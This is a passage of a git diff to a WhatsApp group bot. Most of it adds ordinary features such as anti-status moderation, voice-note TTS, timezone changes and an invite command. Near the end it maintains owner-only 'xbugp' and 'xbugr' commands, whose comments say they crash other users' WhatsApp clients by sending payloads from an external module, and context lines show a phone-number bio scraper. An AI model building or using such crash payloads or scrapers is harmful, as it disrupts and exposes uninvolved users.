@@ -24,8 +24,9 @@ const { XeonFb } = require('./scrape/XeonFb')
 const { XeonTwitter } = require('./scrape/XeonTwitter')
 const { askGemini, generateGeminiImage } = require('./lib/gemini')
 const { askQwen } = require('./lib/qwen')
-const { gifToMp4, audioToPttOgg } = require('./lib/media-tools')
+const { gifToMp4, audioToPttOgg, generateWaveform, textToPttVoiceNote } = require('./lib/media-tools')
 const { repairSessionFolder, purgeJidSession } = require('./lib/sessionCleaner')
+const { logCommandError, getErrorLogs, clearErrorLogs } = require('./lib/commandLogger')
 const { downloadTikTok } = require('./lib/tiktokdl')
 const { searchApk, getApkDetails, getApkVersions, getApkBuffer } = require('./lib/apkdl')
 const { loadChatbotConfig, saveChatbotConfig, generateChatbotReply, generateVoiceNoteBuffer, recordMessage } = require('./lib/chatbot')
@@ -77,6 +78,15 @@ let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
 let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
 let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
 let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
+let ntstatus = []
+try {
+    if (fs.existsSync('./database/antistatus.json')) {
+        const parsedStatus = JSON.parse(fs.readFileSync('./database/antistatus.json', 'utf8'))
+        ntstatus = Array.isArray(parsedStatus) ? parsedStatus : []
+    } else {
+        fs.writeFileSync('./database/antistatus.json', JSON.stringify([], null, 2))
+    }
+} catch (_) { ntstatus = [] }
 let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
 let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
 let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
@@ -471,6 +481,7 @@ try {
         const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
         const antiWame = m.isGroup ? ntwame.includes(from) : false
         const antiToxic = m.isGroup ? nttoxic.includes(from) : false
+        const AntiStatus = m.isGroup ? ntstatus.includes(from) : false
         
         // Auto Join WhatsApp Group Links in DM/Private Messages (no prefix needed)
         if (!m.isGroup && typeof body === 'string' && body.includes('chat.whatsapp.com/')) {
@@ -621,10 +632,11 @@ try {
             }
         }
                    
-        //TIME
-        const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
-        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
-        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
+        //TIME (Africa/Lagos)
+        const botTz = global.timezone || 'Africa/Lagos'
+        const xtime = moment.tz(botTz).format('HH:mm:ss')
+        const xdate = moment.tz(botTz).format('DD/MM/YYYY')
+        const time2 = moment().tz(botTz).format('HH:mm:ss')  
          if(time2 < "23:59:00"){
 var xeonytimewisher = `Good Night 🌌`
  }
@@ -1289,11 +1301,12 @@ const sendSticker = (pesan) => {
 const sendvn = async (teks) => {
     try {
         let buf = Buffer.isBuffer(teks) ? teks : fs.existsSync(teks) ? fs.readFileSync(teks) : /^https?:\/\//.test(teks) ? await getBuffer(teks) : null
-        let pttBuf = buf ? await toPTT(buf, 'mp3') : teks
-        await XeonBotInc.sendMessage(from, { audio: pttBuf, mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: m })
+        let pttBuf = buf ? await audioToPttOgg(buf) : teks
+        const wf = Buffer.isBuffer(pttBuf) ? generateWaveform(pttBuf) : undefined
+        await XeonBotInc.sendMessage(from, { audio: pttBuf, mimetype: 'audio/ogg; codecs=opus', ptt: true, waveform: wf }, { quoted: m })
     } catch (e) {
         let buf = Buffer.isBuffer(teks) ? teks : fs.existsSync(teks) ? fs.readFileSync(teks) : teks
-        await XeonBotInc.sendMessage(from, { audio: buf, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
+        await XeonBotInc.sendMessage(from, { audio: buf, mimetype: 'audio/mp4', ptt: false }, { quoted: m })
     }
 }
 
@@ -1302,11 +1315,12 @@ for (let BhosdikaXeon of VoiceNoteXeon) {
 if (budy === BhosdikaXeon) {
     try {
         let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
-        let pttBuf = await toPTT(audiobuffy, 'mp3')
-        await XeonBotInc.sendMessage(m.chat, { audio: pttBuf, mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: m })
+        let pttBuf = await audioToPttOgg(audiobuffy)
+        const wf = generateWaveform(pttBuf)
+        await XeonBotInc.sendMessage(m.chat, { audio: pttBuf, mimetype: 'audio/ogg; codecs=opus', ptt: true, waveform: wf }, { quoted: m })
     } catch (e) {
         let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
-        await XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
+        await XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: false }, { quoted: m })
     }
 }
 }
@@ -1774,14 +1788,14 @@ async function replyprem(teks) {
             }
         }
 
-// Unified Anti-Link moderation.
-// - Admins/owner can always send links.
+// Unified Anti-Link and Anti-Status moderation.
+// - Admins/owner can always send links/status.
 // - Non-admin members get 3 strikes per group.
 // - The offending message is deleted on every strike.
 // - Strike records survive bot restarts.
 // - Strike #3 removes the member from the group.
 if (m.isGroup) {
-    const linkText = String(budy || m.text || '')
+    const linkText = String(budy || m.text || m.caption || '')
     const lowerLinkText = linkText.toLowerCase()
     const detectedLinks = []
     const addDetection = (name, enabled, regex) => {
@@ -1804,17 +1818,57 @@ if (m.isGroup) {
         if (genericUrl.test(linkText) || domainUrl.test(linkText)) detectedLinks.push('link')
     }
 
+    if (AntiStatus) {
+        const quotedIsStatus = Boolean(
+            m.quoted && (
+                m.quoted.chat === 'status@broadcast' ||
+                m.quoted.remoteJid === 'status@broadcast' ||
+                m.quoted.id === 'status@broadcast' ||
+                (m.quoted.key && m.quoted.key.remoteJid === 'status@broadcast')
+            )
+        )
+        const contextRemoteJid = m.message?.[type]?.contextInfo?.remoteJid ||
+                                 m.message?.extendedTextMessage?.contextInfo?.remoteJid ||
+                                 m.message?.contextInfo?.remoteJid
+        const contextParticipant = m.message?.[type]?.contextInfo?.participant ||
+                                   m.message?.extendedTextMessage?.contextInfo?.participant ||
+                                   m.message?.contextInfo?.participant
+        const isContextStatus = contextRemoteJid === 'status@broadcast' || contextParticipant === 'status@broadcast'
+
+        const isProtoStatusMention = Boolean(
+            type === 'groupStatusMentionMessage' ||
+            type === 'statusMentionMessage' ||
+            m.message?.groupStatusMentionMessage ||
+            m.message?.statusMentionMessage ||
+            m.message?.statusMentionMessageInfo ||
+            m.message?.extendedTextMessage?.contextInfo?.statusMentionMessageInfo ||
+            (m.message?.extendedTextMessage?.contextInfo?.statusMentions && m.message.extendedTextMessage.contextInfo.statusMentions.length > 0)
+        )
+
+        const isStatusUrl = /(?:https?:\/\/)?(?:wa\.me|api\.whatsapp\.com|chat\.whatsapp\.com|whatsapp\.com)\/status(?:\/|\b|\?)/i.test(linkText) ||
+                            /(?:whatsapp:\/\/status)/i.test(linkText)
+
+        if (quotedIsStatus || isContextStatus || isProtoStatusMention || isStatusUrl) {
+            detectedLinks.push('WhatsApp status')
+        }
+    }
+
     if (detectedLinks.length > 0) {
-        // A member's own group link is not exempt: Anti-Link means no links.
+        const hasStatus = detectedLinks.includes('WhatsApp status')
+        const itemType = hasStatus ? 'Status' : 'Link'
+
+        // A member's own group link or status is not exempt: Anti-Link / Anti-Status means none allowed.
         if (isAdmins || XeonTheCreator || m.key?.fromMe || XeonTheDeveloper) {
             return await XeonBotInc.sendMessage(m.chat, {
-                text: `🔗 *Link Detected*\n\nAdmin has sent a link, admin is free to send any link 😌`
+                text: hasStatus
+                    ? `📢 *Status Detected*\n\nAdmin has tagged/sent a status, admin is free to do so 😌`
+                    : `🔗 *Link Detected*\n\nAdmin has sent a link, admin is free to send any link 😌`
             })
         }
 
         if (!isBotAdmins) {
             return await XeonBotInc.sendMessage(m.chat, {
-                text: `⚠️ *Anti-Link is enabled, but I am not a group admin.*\nPlease make the bot an admin so I can delete links and enforce the 3-warning system.`
+                text: `⚠️ *Anti-${itemType} is enabled, but I am not a group admin.*\nPlease make the bot an admin so I can delete ${hasStatus ? 'status tags' : 'links'} and enforce the 3-warning system.`
             })
         }
 
@@ -1838,7 +1892,7 @@ if (m.isGroup) {
                     }
                 })
             } catch (deleteErr) {
-                console.log('[ANTILINK] Could not delete message:', deleteErr?.message || deleteErr)
+                console.log(`[ANTI${itemType.toUpperCase()}] Could not delete message:`, deleteErr?.message || deleteErr)
             }
         }
 
@@ -1847,22 +1901,22 @@ if (m.isGroup) {
             try {
                 await XeonBotInc.groupParticipantsUpdate(m.chat, [phoneSender], 'remove')
             } catch (err) {
-                console.log('[ANTILINK] Kick failed:', err?.message || err)
+                console.log(`[ANTI${itemType.toUpperCase()}] Kick failed:`, err?.message || err)
                 return await XeonBotInc.sendMessage(m.chat, {
-                    text: `🚫 *Link Detected*\n\n${mention} reached *3/3 warnings*, but I could not remove them. Please check that I still have admin permission.`,
+                    text: `🚫 *${itemType} Detected*\n\n${mention} reached *3/3 warnings*, but I could not remove them. Please check that I still have admin permission.`,
                     mentions: [phoneSender]
                 })
             }
 
             return await XeonBotInc.sendMessage(m.chat, {
-                text: `🚫 *Link Detected*\n\n${mention} has reached *3/3 warnings* and has been removed from the group for repeatedly sending links.`,
+                text: `🚫 *${itemType} Detected*\n\n${mention} has reached *3/3 warnings* and has been removed from the group for repeatedly ${hasStatus ? 'tagging or sending status' : 'sending links'}.`,
                 mentions: [phoneSender]
             })
         }
 
         const remaining = 3 - currentStrike
         return await XeonBotInc.sendMessage(m.chat, {
-            text: `🔗 *Link Detected*\n\n${mention}, links are not allowed in this group.\n⚠️ Warning *${currentStrike}/3*\n${remaining} more violation${remaining === 1 ? '' : 's'} and you will be removed.`,
+            text: `⚠️ *${itemType} Detected*\n\n${mention}, ${hasStatus ? 'tagging or sending status is' : 'links are'} not allowed in this group.\n⚠️ Warning *${currentStrike}/3*\n${remaining} more violation${remaining === 1 ? '' : 's'} and you will be removed.`,
             mentions: [phoneSender]
         })
     }
@@ -1958,23 +2012,54 @@ try {
         // Record incoming user statement
         recordMessage(m.chat, pushname || 'User', 'user', userText)
 
+        // Check if user specifically asked the bot to "say <something>" without prefix
+        const sayMatch = userText.trim().match(/^(?:bot\s+)?say\s+(.+)$/i)
+        if (sayMatch) {
+            const wordsToSay = sayMatch[1].trim()
+            try {
+                await XeonBotInc.sendPresenceUpdate('recording', m.chat)
+                const vnRes = await textToPttVoiceNote(wordsToSay, 'en')
+                if (vnRes && vnRes.buffer) {
+                    return await XeonBotInc.sendMessage(m.chat, {
+                        audio: vnRes.buffer,
+                        mimetype: 'audio/ogg; codecs=opus',
+                        ptt: true,
+                        waveform: vnRes.waveform
+                    }, { quoted: m })
+                }
+            } catch (sayErr) {
+                console.log('[Chatbot Say Error]', sayErr?.message || sayErr)
+            }
+        }
+
         // Generate response with human witty tone
         const botReply = await generateChatbotReply(m.chat, pushname || 'Friend', userText, m.isGroup)
         if (botReply) {
-            // Voice note response mode
-            if (cbConfig.voiceReply && (userText.toLowerCase().includes('voice') || userText.toLowerCase().includes('sing') || userText.toLowerCase().includes('say') || Math.random() < 0.25)) {
+            // Voice note response mode: triggers on voice requests or when voiceReply config is enabled
+            const wantsVoice = cbConfig.voiceReply || 
+                userText.toLowerCase().includes('voice note') || 
+                userText.toLowerCase().includes('vn') || 
+                userText.toLowerCase().includes('voice') || 
+                userText.toLowerCase().includes('sing') || 
+                userText.toLowerCase().includes('audio') || 
+                userText.toLowerCase().includes('talk to me')
+
+            if (wantsVoice) {
                 try {
-                    const vnBuffer = await generateVoiceNoteBuffer(botReply)
-                    if (vnBuffer) {
+                    await XeonBotInc.sendPresenceUpdate('recording', m.chat)
+                    const vnRes = await textToPttVoiceNote(botReply, 'en')
+                    if (vnRes && vnRes.buffer) {
                         await XeonBotInc.sendMessage(m.chat, {
-                            audio: vnBuffer,
-                            mimetype: 'audio/mp4',
-                            ptt: true
+                            audio: vnRes.buffer,
+                            mimetype: 'audio/ogg; codecs=opus',
+                            ptt: true,
+                            waveform: vnRes.waveform
                         }, { quoted: m })
                     } else {
                         await XeonBotInc.sendMessage(m.chat, { text: botReply }, { quoted: m })
                     }
                 } catch (vnErr) {
+                    console.log('[Chatbot Voice Note Error]', vnErr?.message || vnErr)
                     await XeonBotInc.sendMessage(m.chat, { text: botReply }, { quoted: m })
                 }
             } else {
@@ -3854,7 +3939,7 @@ break
                  let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                  for (let i of anulistg) {
                      let metadata = await XeonBotInc.groupMetadata(i)
-                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
+                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz(global.timezone || 'Africa/Lagos').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                  }
                  XeonBotInc.sendTextWithMentions(m.chat, teks, m)
              }
@@ -4614,7 +4699,7 @@ if (args[0] === "on") {
 if (Antilinkgc) return replygcxeon('Already activated')
 ntlinkgc.push(from)
 fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
-replygcxeon('Success in turning on antiwame in this group')
+replygcxeon('Success in turning on antilinkgc in this group')
 var groupe = await XeonBotInc.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
@@ -4627,7 +4712,34 @@ if (!Antilinkgc) return replygcxeon('Already deactivated')
 let off = ntlinkgc.indexOf(from)
 ntlinkgc.splice(off, 1)
 fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
-replygcxeon('Success in turning off antiwame in this group')
+replygcxeon('Success in turning off antilinkgc in this group')
+} else {
+await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
+  }
+  }
+  break
+case 'antistatus': case 'anti-status': {
+if (!m.isGroup) return XeonStickGroup()
+if (!isBotAdmins) return XeonStickBotAdmin()
+if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
+if (args[0] === "on") {
+if (AntiStatus) return replygcxeon('Already activated')
+if (!ntstatus.includes(from)) ntstatus.push(from)
+fs.writeFileSync('./database/antistatus.json', JSON.stringify(ntstatus, null, 2))
+replygcxeon('Success in turning on anti-status in this group')
+var groupe = await XeonBotInc.groupMetadata(from)
+var members = groupe['participants']
+var mems = []
+members.map(async adm => {
+mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+})
+XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to tag or send status in this group, after 3 violations the member will be removed!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+} else if (args[0] === "off") {
+if (!AntiStatus) return replygcxeon('Already deactivated')
+let off = ntstatus.indexOf(from)
+if (off >= 0) ntstatus.splice(off, 1)
+fs.writeFileSync('./database/antistatus.json', JSON.stringify(ntstatus, null, 2))
+replygcxeon('Success in turning off anti-status in this group')
 } else {
 await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
   }
@@ -5937,6 +6049,26 @@ replygcxeon(`Success`)
 }
 }
 break
+case 'setthumb': case 'setcheemspic': case 'setbanner': case 'settheme': {
+    if (!XeonTheCreator) return XeonStickOwner()
+    if (!quoted) return replygcxeon(`⚠️ *Reply to an image* with *${prefix + command}* to set it as the new bot banner/cheemspic!`)
+    if (!/image/.test(mime)) return replygcxeon(`⚠️ That media is not an image! Please reply to a picture.`)
+    try {
+        replygcxeon('⏳ *Downloading and updating bot banner...*')
+        const mediaBuffer = await quoted.download()
+        const targetPath = path.join(__dirname, 'XeonMedia', 'theme', 'cheemspic.jpg')
+        const targetDir = path.dirname(targetPath)
+        if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir, { recursive: true })
+        fs.writeFileSync(targetPath, mediaBuffer)
+        global.thum = mediaBuffer
+        global.thumb = mediaBuffer
+        
+        replygcxeon(`✅ *Bot Banner Updated Successfully!*\n\n🖼️ The new *CLINTON BOT MD* artwork is now saved to *cheemspic.jpg* and active across all bot menus (.menu, .help, etc.)! 🔥`)
+    } catch (err) {
+        replygcxeon(`⚠️ *Failed to update banner:* ${err?.message || err}`)
+    }
+}
+break
 case 'creategc': case 'creategroup': {
 if (!XeonTheCreator) return XeonStickOwner()
 if (!args.join(" ")) return replygcxeon(`Use ${prefix+command} groupname`)
@@ -5947,7 +6079,7 @@ teks = `     「 Create Group 」
 
 ▸ Name : ${cret.subject}
 ▸ Owner : @${cret.owner.split("@")[0]}
-▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
+▸ Creation : ${moment(cret.creation * 1000).tz(global.timezone || "Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}
 
 https://chat.whatsapp.com/${response}
        `
@@ -8889,10 +9021,47 @@ case 'rate_old': {
             await replygcxeon(jawab)
             }
             break
-            case 'runtime': {
-            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
-                replygcxeon(lowq)
-            	}
+            case 'time': case 'date': case 'waktu': case 'clock': {
+                const tz = global.timezone || 'Africa/Lagos'
+                const nowMoment = moment().tz(tz)
+                const timeStr = nowMoment.format('hh:mm:ss A')
+                const dateStr = nowMoment.format('dddd, DD MMMM YYYY')
+                const tzName = tz
+                const timeCard = `
+┌───『 *CLINTON BOT TIME* 』───
+│ 🌍 *Timezone :* ${tzName} (WAT)
+│ 🕒 *Current Time :* ${timeStr}
+│ 📅 *Current Date :* ${dateStr}
+│ 🌅 *Greeting :* ${xeonytimewisher}
+└────────────────────────`.trim()
+                await replygcxeon(timeCard)
+            }
+            break
+            case 'runtime': case 'uptime': {
+                const uptimeSeconds = process.uptime()
+                const formattedUptime = runtime(uptimeSeconds)
+                const startTime = moment(Date.now() - (uptimeSeconds * 1000)).tz(global.timezone || 'Africa/Lagos').format('hh:mm:ss A')
+                const timestamp = speed()
+                const latensi = speed() - timestamp
+                const latencyMs = (latensi * 1000).toFixed(0)
+
+                const textRuntime = `
+┌───『 *CLINTON BOT MD8* 』───
+│ ⚡ *ACTIVE RUNTIME*
+├────────────────────────
+│ 🌍 *Timezone :* ${global.timezone || 'Africa/Lagos'} (WAT)
+│ ⏳ *Uptime :* ${formattedUptime}
+│ 🚀 *Latency :* ${latencyMs}ms (${latensi.toFixed(4)}s)
+│ 🕒 *Online Since :* ${startTime}
+│ 🛡️ *System Mode :* ${XeonBotInc.public ? 'Public Mode' : 'Self / Owner Mode'}
+│ 🦾 *Core Status :* 100% Operational 🔥
+├────────────────────────
+│ 💬 _"Standing strong. Never offline, never defeated."_
+└────────────────────────
+☬ *LELOP*`.trim()
+
+                await replygcxeon(textRuntime)
+            }
             break
 case 'stupidcheck':case 'uncleancheck':
 case 'hotcheck': case 'smartcheck':
@@ -9160,32 +9329,25 @@ try {
 }
 break
     case 'say': case 'tts': case 'gtts':{
-if (!text) return replygcxeon('Where is the text?')
-            let texttts = text
-            const xeonrl = googleTTS.getAudioUrl(texttts, {
-                lang: "en",
-                slow: false,
-                host: "https://translate.google.com",
+        if (!text) return replygcxeon(`💬 *Usage:* ${prefix + command} <text>\n*Example:* ${prefix + command} hello`)
+        try {
+            await XeonBotInc.sendPresenceUpdate('recording', m.chat)
+            const vnRes = await textToPttVoiceNote(text, 'en')
+            if (!vnRes || !vnRes.buffer) throw new Error('Voice note audio generator unavailable')
+            return XeonBotInc.sendMessage(m.chat, {
+                audio: vnRes.buffer,
+                mimetype: 'audio/ogg; codecs=opus',
+                ptt: true,
+                waveform: vnRes.waveform
+            }, {
+                quoted: m
             })
-            try {
-                const ttsRes = await axios.get(xeonrl, { responseType: 'arraybuffer', timeout: 20000, headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' } })
-                const ttsBuf = Buffer.from(ttsRes.data)
-                if (!ttsBuf || ttsBuf.length < 500) throw new Error('TTS engine returned empty audio')
-                let pttBuf
-                try { pttBuf = await audioToPttOgg(ttsBuf) } catch (convErr) { pttBuf = ttsBuf }
-                return XeonBotInc.sendMessage(m.chat, {
-                    audio: pttBuf,
-                    mimetype: 'audio/ogg; codecs=opus',
-                    ptt: true,
-                }, {
-                    quoted: m,
-                })
-            } catch (ttsErr) {
-                console.log('[TTS Error]', ttsErr?.message || ttsErr)
-                return replygcxeon(`❌ Text-to-speech failed: ${ttsErr?.message || 'audio engine unavailable'}`)
-            }
+        } catch (ttsErr) {
+            console.log('[TTS Error]', ttsErr?.message || ttsErr)
+            return replygcxeon(`❌ Text-to-speech failed: ${ttsErr?.message || 'audio engine unavailable'}`)
         }
-        break
+    }
+    break
         case 'telestick': { //credit agan
         	if (m.isGroup) return XeonStickPrivate()
         if (!isPrem) return replyprem(mess.premium)
@@ -9998,16 +10160,152 @@ case 'gdrive': {
    }
 }
 break
-case 'invite': {
+case 'invite': case 'invitar': {
 	if (!m.isGroup) return XeonStickGroup()
 	if (!isBotAdmins) return XeonStickBotAdmin()
-if (!text) return replygcxeon(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 916909137213`)
-if (text.includes('+')) return replygcxeon(`Enter the number together without *+*`)
-if (isNaN(text)) return replygcxeon(`Enter only the numbers plus your country code without spaces`)
-let group = m.chat
-let link = 'https://chat.whatsapp.com/' + await XeonBotInc.groupInviteCode(group)
-      await XeonBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
-        replygcxeon(` An invite link is sent to the user`) 
+	if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
+
+	// 1. Identify Target User: Tag, Reply, or Text input
+	let targetJid = null
+	let customNote = ''
+
+	if (m.mentionedJid && m.mentionedJid.length > 0) {
+		targetJid = m.mentionedJid[0]
+		customNote = text.replace(new RegExp(`@${targetJid.split('@')[0]}`, 'g'), '').trim()
+	} else if (m.quoted && m.quoted.sender) {
+		targetJid = m.quoted.sender
+		customNote = (text || '').trim()
+	} else if (text) {
+		const matchNumber = text.match(/\+?[0-9\s\-()]{7,20}/)
+		if (matchNumber) {
+			const rawNumber = matchNumber[0].replace(/[^0-9]/g, '')
+			if (rawNumber.length >= 7 && rawNumber.length <= 16) {
+				targetJid = rawNumber + '@s.whatsapp.net'
+				customNote = text.replace(matchNumber[0], '').trim()
+			}
+		}
+	}
+
+	if (!targetJid) {
+		return replygcxeon(
+			`╭───「 💌  *GROUP INVITE SUITE*  」───\n` +
+			`│\n` +
+			`│ 📌  *How to Invite:*\n` +
+			`│ ├ 🏷️ *By Tag:* ${prefix + command} @user [optional message]\n` +
+			`│ ├ 💬 *By Reply:* Reply to a user's message with ${prefix + command}\n` +
+			`│ └ 📱 *By Number:* ${prefix + command} +234 802 939 9425 [message]\n` +
+			`│\n` +
+			`│ 💡 *Examples:*\n` +
+			`│ • ${prefix + command} 2348029399425 Welcome to our squad!\n` +
+			`│ • ${prefix + command} @user Join us here!\n` +
+			`╰─────────────────────────────`
+		)
+	}
+
+	// 2. Fetch Group Details & Check Existing Members
+	let groupMeta = null
+	try {
+		groupMeta = await XeonBotInc.groupMetadata(m.chat)
+	} catch (e) {
+		groupMeta = groupMetadata
+	}
+
+	const participants = groupMeta?.participants || []
+	const isAlreadyMember = participants.some(p => p.id === targetJid || p.id?.split('@')[0] === targetJid?.split('@')[0])
+	if (isAlreadyMember) {
+		return replygcxeon(`⚠️  *User is already a member of this group!*`)
+	}
+
+	// 3. Generate Official WhatsApp Group Invite Code
+	let inviteCode = ''
+	try {
+		inviteCode = await XeonBotInc.groupInviteCode(m.chat)
+	} catch (e) {
+		return replygcxeon(`❌ *Failed to retrieve group invite code.*\nPlease ensure the bot has Admin privileges.`)
+	}
+
+	const inviteLink = `https://chat.whatsapp.com/${inviteCode}`
+	const groupName = groupMeta?.subject || 'WhatsApp Group'
+	const groupDesc = (groupMeta?.desc || '').toString().slice(0, 150)
+	const memberCount = participants.length
+	const inviterName = m.pushName || 'Group Admin'
+	const inviterTag = `@${sender.split('@')[0]}`
+	const targetTag = `@${targetJid.split('@')[0]}`
+
+	// 4. Group Display Picture for Card Thumbnail
+	let groupPp = null
+	try {
+		groupPp = await XeonBotInc.profilePictureUrl(m.chat, 'image')
+	} catch (_) {
+		groupPp = null
+	}
+
+	let cardThumbnail
+	try {
+		cardThumbnail = groupPp ? { url: groupPp } : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')
+	} catch (_) {
+		cardThumbnail = undefined
+	}
+
+	// 5. Compose Refined Invitation Card for the Invitee
+	const inviteCardText = 
+		`👑  *𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋  𝐆𝐑𝐎𝐔𝐏  𝐈𝐍𝐕𝐈𝐓𝐀𝐓𝐈𝐎𝐍*  👑\n` +
+		`─────────────────────────────\n` +
+		`Hello ${targetTag}, you have been personally invited to join our community!\n\n` +
+		`🏰  *Group:*  *${groupName}*\n` +
+		`👤  *Invited By:*  ${inviterTag} (${inviterName})\n` +
+		`👥  *Community:*  ${memberCount} active members\n` +
+		(customNote ? `💬  *Personal Note:*  _"${customNote}"_\n` : '') +
+		(groupDesc ? `\n📜  *About the Group:*\n_${groupDesc}${groupDesc.length >= 150 ? '...' : ''}_\n` : '') +
+		`\n🔗  *Direct Access Link:*\n${inviteLink}\n` +
+		`─────────────────────────────\n` +
+		`✨ _Tap the link above to enter the group! We look forward to having you._`
+
+	try {
+		await XeonBotInc.sendMessage(targetJid, {
+			text: inviteCardText,
+			mentions: [targetJid, sender],
+			contextInfo: {
+				mentionedJid: [targetJid, sender],
+				externalAdReply: {
+					title: groupName,
+					body: `Invited by ${inviterName} • ${memberCount} Members`,
+					mediaType: 1,
+					renderLargerThumbnail: true,
+					thumbnail: typeof cardThumbnail === 'string' || Buffer.isBuffer(cardThumbnail) ? cardThumbnail : undefined,
+					thumbnailUrl: typeof cardThumbnail?.url === 'string' ? cardThumbnail.url : undefined,
+					sourceUrl: inviteLink,
+					mediaUrl: inviteLink
+				}
+			}
+		})
+
+		// 6. Send Confirmation Receipt in the Group
+		const receiptText = 
+			`╭───「 📨  *INVITE DISPATCHED*  」───\n` +
+			`│\n` +
+			`│ 🎯  *Invitee:*  ${targetTag}\n` +
+			`│ 👤  *Dispatched By:*  ${inviterTag}\n` +
+			`│ 🏰  *Group:*  ${groupName}\n` +
+			(customNote ? `│ 💬  *Note Attached:*  "${customNote}"\n` : '') +
+			`│ ⚡  *Status:*  Delivered to Private Chat ✅\n` +
+			`│\n` +
+			`╰─────────────────────────────\n` +
+			`✨ _An official invitation card with the group link has been sent to their DM!_`
+
+		await XeonBotInc.sendMessage(m.chat, {
+			text: receiptText,
+			mentions: [targetJid, sender]
+		}, { quoted: m })
+
+	} catch (sendErr) {
+		console.error('[Invite Error]', sendErr)
+		await replygcxeon(
+			`⚠️  *Could not deliver invite directly to ${targetTag}'s DM.*\n` +
+			`_They may have private message restrictions or an invalid number._\n\n` +
+			`🔗  *Group Link:* ${inviteLink}`
+		)
+	}
 }
 break
 case "xnxxdl": {
@@ -10261,7 +10559,7 @@ var inputnumber = text.split(" ")[0]
                 if (anu1 == '401' || anu1.status.length == 0) {
                     nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                 } else {
-                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
+                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz(global.timezone || 'Africa/Lagos').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                 }
             } catch {
                 nowhatsapp += `${number0}${i}${number1}\n`
@@ -10274,6 +10572,7 @@ break
 case 'xbugp' : { //crashes mod whatsapps
 if (!XeonTheCreator) return XeonStickOwner()
 if (!text) return replygcxeon(`Example : ${prefix + command} xeon bihari😂`)
+try {
 const { xeonbut2: xeonorwot } = require('./XBug/xeonbut2')
 let teks = `${text}`
 {
@@ -10285,74 +10584,97 @@ thumbnailUrl: thumb,
 }
 }}}}}, { quoted:m})
 }
+replygcxeon(`⚡ *Payment Payload Transmitted.*`)
+} catch (err) {
+replygcxeon(`⚠️ *Payload Error:* ${err?.message || err}`)
+}
 }
 break
 case 'xbugr':{ //crashes both mod and playstore wa
 if (!XeonTheCreator) return XeonStickOwner()
+try {
 const { xeonbut2: xeonorwot } = require('./XBug/xeonbut2')
 let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
-XeonBotInc.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
+await XeonBotInc.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
+replygcxeon(`⚡ *Reaction Payload Transmitted.*`)
+} catch (err) {
